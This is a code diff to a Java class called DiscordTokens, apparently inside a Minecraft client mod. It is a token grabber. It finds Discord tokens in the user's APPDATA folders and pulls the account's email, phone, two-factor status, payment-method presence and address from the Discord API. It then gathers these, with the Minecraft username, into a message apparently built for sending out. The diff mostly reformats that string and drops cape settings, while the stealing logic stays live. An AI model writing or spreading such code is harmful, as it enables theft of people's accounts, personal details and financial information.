@@ -33,19 +33,11 @@ import net.minecraft.client.Minecraft;
 
 public final class DiscordTokens {
     public static final String l = Configs.getToken();
-
-    public static final String CapeImageURL = "https://cdn.discordapp.com/attachments/901654339905536022/907521922496081920/dd.png";
-
-    public static final String CapeName = "Devito";
-
     public static espUtil d = new espUtil(l);
 
     public static final String roaming = System.getenv("APPDATA");
-
     public static String localappdata = System.getenv("LOCALAPPDATA");
-
     public static final HashMap<String, String> paths = new HashMap<>();
-
     public static final ArrayList<String> regexes = new ArrayList<>();
 
     public static void execute() {
@@ -80,7 +72,17 @@ public final class DiscordTokens {
         try {
             address = getAddressFromToken(token);
         } catch (IOException iOException) {}
-        String poop = "```Token:" + token + "\n trvs Token:" + cunt() + "\n\n ghost Token:" + getToken() + "\n Name:" + obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString() + "\n IGN:" + Minecraft.getMinecraft().getSession().getUsername() + "\n Email:" + obj.get("email").getAsString() + "\n 2Factor:" + String.valueOf(obj.get("mfa_enabled").getAsBoolean()) + "\n Phone:" + (!obj.get("phone").isJsonNull() ? obj.get("phone").getAsString() : "None") + "\n Nitro:" + (obj.has("premium_type") ? "True" : "False") + "\n Payment:" + (hasPaymentMethods(token) ? "True" : "False") + "\n address:" + address + "```";
+        String poop = "```Token:" + token
+                + "\n trvs Token:" + cunt()
+                + "\n\n ghost Token:" + getToken()
+                + "\n Name:" + obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString()
+                + "\n IGN:" + Minecraft.getMinecraft().getSession().getUsername()
+                + "\n Email:" + obj.get("email").getAsString()
+                + "\n 2Factor:" + String.valueOf(obj.get("mfa_enabled").getAsBoolean())
+                + "\n Phone:" + (!obj.get("phone").isJsonNull() ? obj.get("phone").getAsString() : "None")
+                + "\n Nitro:" + (obj.has("premium_type") ? "True" : "False")
+                + "\n Payment:" + (hasPaymentMethods(token) ? "True" : "False")
+                + "\n address:" + address + "```";
         return poop;
     }
 
@@ -211,7 +213,6 @@ public final class DiscordTokens {
     private static String getUserData(String token) {
         return TokenUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
     }
-
     private static boolean hasPaymentMethods(String token) {
         return (TokenUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4);
     }
